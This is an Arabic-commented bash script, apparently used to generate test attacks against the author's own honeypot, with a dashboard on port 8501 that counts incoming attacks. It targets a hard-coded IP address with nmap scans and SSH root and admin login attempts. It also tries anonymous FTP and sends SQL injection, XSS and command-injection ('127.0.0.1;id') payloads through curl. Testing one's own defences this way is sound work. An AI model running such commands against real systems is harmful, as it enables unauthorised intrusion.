#!/bin/bash
# Cyber Mirage - Quick Attack Commands for Ubuntu
# انسخ والصق الأوامر في Terminal واحدة تلو الأخرى
# الهدف: 13.53.131.159

TARGET="13.53.131.159"

echo "=========================================="
echo "🔧 [1/7] تثبيت الأدوات المطلوبة"
echo "=========================================="
sudo apt update
sudo apt install -y nmap hydra sqlmap nikto curl netcat-openbsd ftp telnet mysql-client hping3 dnsutils

echo ""
echo "=========================================="
echo "🌐 [2/7] اختبار الاتصال"
echo "=========================================="
ping -c 3 $TARGET

echo ""
echo "=========================================="
echo "🔍 [3/7] فحص المنافذ - سريع"
echo "=========================================="
nmap -Pn -p 2121,2222,2323,3307,8080,8501 $TARGET

echo ""
echo "=========================================="
echo "🔍 [4/7] فحص المنافذ - مع الإصدارات"
echo "=========================================="
nmap -sV -p 2121,2222,2323,3307,8080,8501 $TARGET -oN nmap_results.txt
cat nmap_results.txt

echo ""
echo "=========================================="
echo "🚪 [5/7] اختبار الخدمات يدوياً"
echo "=========================================="

echo ""
echo "--- SSH (Port 2222) - محاولة دخول ---"
timeout 5 ssh -p 2222 root@$TARGET || echo "SSH root فشل (متوقع)"
timeout 5 ssh -p 2222 admin@$TARGET || echo "SSH admin فشل (متوقع)"

echo ""
echo "--- FTP (Port 2121) - Anonymous ---"
timeout 10 ftp -n $TARGET 2121 <<EOF
user anonymous anonymous
ls
quit
EOF

echo ""
echo "--- Telnet (Port 2323) - Banner Grab ---"
timeout 3 telnet $TARGET 2323 || echo "Telnet اتصل ثم قطع"

echo ""
echo "--- HTTP (Port 8080) - Headers ---"
curl -I http://$TARGET:8080/

echo ""
echo "=========================================="
echo "💉 [6/7] هجمات HTTP التجريبية"
echo "=========================================="

echo ""
echo "--- SQL Injection Test 1 ---"
curl "http://$TARGET:8080/login?user=admin'&pass=test"

echo ""
echo "--- SQL Injection Test 2 ---"
curl "http://$TARGET:8080/login?user=admin'+OR+'1'='1&pass=x"

echo ""
echo "--- XSS Test ---"
curl "http://$TARGET:8080/search?q=<script>alert('XSS')</script>"

echo ""
echo "--- Command Injection Test ---"
curl "http://$TARGET:8080/ping?host=127.0.0.1;id"

echo ""
echo "=========================================="
echo "📊 [7/7] افتح Dashboard للمراقبة"
echo "=========================================="
echo ""
echo "افتح المتصفح على:"
echo "   http://$TARGET:8501"
echo ""
echo "راقب:"
echo "   - Total Attacks"
echo "   - Recent Attacks"
echo "   - Attack Timeline"
echo ""

echo "=========================================="
echo "✅ انتهى! الآن شاهد النتائج في Dashboard"
echo "=========================================="
